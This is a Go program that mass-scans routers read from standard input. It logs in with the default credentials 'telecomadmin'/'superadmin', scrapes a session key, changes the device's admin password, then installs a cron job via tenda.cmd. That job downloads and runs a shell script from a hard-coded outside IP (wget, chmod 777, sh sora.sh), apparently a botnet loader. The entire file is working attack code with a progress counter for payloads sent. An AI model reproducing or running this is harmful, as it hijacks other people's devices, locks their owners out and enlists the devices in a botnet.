package main

import (
    "net"
    "time"
    "bufio"
    "strings"
    "fmt"
    "os"
    "sync"
    "strconv"
    "net/url"
    "encoding/base64"
)

var CONNECT_TIMEOUT time.Duration = 30
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup
var statusAttempted, statusFound, stautsChanged, stautsSent int

var newPassword string = "superadmin" // new password on device
var cronCommand string = "wget http://37.0.10.182/sora.sh; chmod 777 sora.sh; sh sora.sh" // command to run ever x minutes
var cronDelayMins int = 30

var useUser string = "telecomadmin"
var usePass string = "superadmin" // use newpassword after changine passwords
var authCookie string = base64.StdEncoding.EncodeToString([]byte(useUser + ":" + usePass))
var newCookie string = base64.StdEncoding.EncodeToString([]byte(useUser + ":" + newPassword))

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    if (s > 0 && e > s + 1) {
        return str[s:e]
    } else {
        return "null"
    }
}

func readFullBuffer(conn net.Conn) (string, int) {

    var totalBuf []byte = []byte("")

    for {
        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf := make([]byte, 1024)
        l, err := conn.Read(bytebuf)
        if err != nil || l <= 0 {
            break
        }
        totalBuf = append(totalBuf, bytebuf...)
    }

    if len(string(totalBuf)) <= 0 {
        return "nil", -1
    } else {
        return string(totalBuf), len(string(totalBuf))
    }
}

func processTarget(target string) {

    conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
    if err != nil {
		syncWait.Done()
        return
    }

    statusAttempted++
    setWriteTimeout(conn, WRITE_TIMEOUT)
    conn.Write([]byte("POST / HTTP/1.1\r\nHost: " + target + "\r\nContent-Length: 0\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://" + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nCookie: Authorization=Basic " + authCookie + "\r\nConnection: close\r\n\r\n"))

    totalBuf, lenBuf := readFullBuffer(conn)
    if lenBuf <= 0 {
        //fmt.Println("No in?")
        conn.Close()
        syncWait.Done()
        return
    }

    conn.Close()

    if strings.Contains(totalBuf, "200 Ok") && strings.Contains(totalBuf, "var empty = '0';") {
        statusFound++

        conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
        if err != nil {
            syncWait.Done()
            return
        }

        setReadTimeout(conn, READ_TIMEOUT)
        conn.Write([]byte("GET /temp.html HTTP/1.1\r\nHost: " + target + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/settings.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nCookie: Authorization=Basic " + authCookie + "\r\nConnection: close\r\n\r\n"))

        totalBuf, lenBuf := readFullBuffer(conn)
        if lenBuf <= 0 {
            conn.Close()
            syncWait.Done()
            return
        }

        conn.Close()

        bufferLen := len("&sessionKey=")
        indexPos := strings.Index(totalBuf, "&sessionKey=")
        endPos := 0

        if indexPos == -1 {
            syncWait.Done()
            return
        }

        for i := 0; i < len(totalBuf) - indexPos; i++ {
            char := totalBuf[indexPos+i:indexPos+i+1]
            if char == "'" {
                endPos = i
            }
        }

        if endPos == 0 {
            syncWait.Done()
            return
        }

        // remove last 2 chars '; and also the first ' so left with session key only
        validSession := totalBuf[indexPos+bufferLen:bufferLen+endPos]
        validSession = validSession[0:10]

        if len(validSession) == 10 {
            conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
            if err != nil {
                syncWait.Done()
                return
            }

            setReadTimeout(conn, READ_TIMEOUT)
            conn.Write([]byte("GET /password.cgi?inUserName=" + useUser + "&inPassword=" + newPassword + "&inOrgPassword=" + usePass + "&sessionKey=" + validSession + " HTTP/1.1\r\nHost: " + target + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/password.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nCookie: Authorization=Basic " + authCookie + "\r\nConnection: close\r\n\r\n"))

            totalBuf, lenBuf := readFullBuffer(conn)
            if lenBuf <= 0 {
                conn.Close()
                syncWait.Done()
                return
            }

            conn.Close()

            if strings.Contains(totalBuf, "Password change successful") {
                stautsChanged++

                conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
                if err != nil {
                    syncWait.Done()
                    return
                }

                setReadTimeout(conn, READ_TIMEOUT)
                conn.Write([]byte("GET /tenda.cmd?action=add&name=.&rule=" + strconv.Itoa(cronDelayMins) + "%20*%20*%20*%20*%20" + cronCommand + " HTTP/1.1\r\nHost: " + target + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/crontabadd.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nCookie: Authorization=Basic " + newCookie + "\r\nConnection: close\r\n\r\n"))

                totalBuf, lenBuf := readFullBuffer(conn)
                if lenBuf <= 0 {
                    conn.Close()
                    syncWait.Done()
                    return
                }

                conn.Close()
                if strings.Contains(totalBuf, "200 OK") {
                    stautsSent += 1
                }
            }
        }
    }

    syncWait.Done()
    return
}

func main() {

	var i int = 0

    cronCommand = url.QueryEscape(cronCommand)

    if (len(os.Args) != 2) {
        fmt.Println("[Scanner] Missing argument (port/listen)")
        return
    }

	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Logins %d | Changed Logins %d | Payload Sent %d\r\n", i, statusAttempted, statusFound, stautsChanged, stautsSent)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            if os.Args[1] == "listen" {
        		go processTarget(scan.Text())
        	} else {
        		go processTarget(scan.Text() + ":" + os.Args[1])
        	}
            syncWait.Add(1)
        }
    }
}
